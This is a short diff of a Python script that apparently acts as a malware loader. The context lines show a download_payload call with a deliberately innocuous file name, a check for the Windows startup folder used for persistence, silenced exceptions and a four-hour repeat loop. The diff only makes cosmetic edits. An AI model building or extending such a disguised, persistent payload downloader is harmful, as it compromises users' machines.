@@ -81,7 +81,6 @@ def download_payload(file_name, delete_before_trying):
 
 
 first_run = True
-
 while True:
     try:
         # check if it's run in C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\programs
@@ -92,7 +91,7 @@ while True:
         pass
     try:
         download_payload(file_name="put a totally not suspicious name here", delete_before_trying=True)
-    except Exception as e:  # NOQA (No Quality Assurance, suppressed the warning)
+    except Exception:  # NOQA (No Quality Assurance, suppressed the warning)
         pass
     
     time.sleep(4 * 60 * 60)  # 4 hours
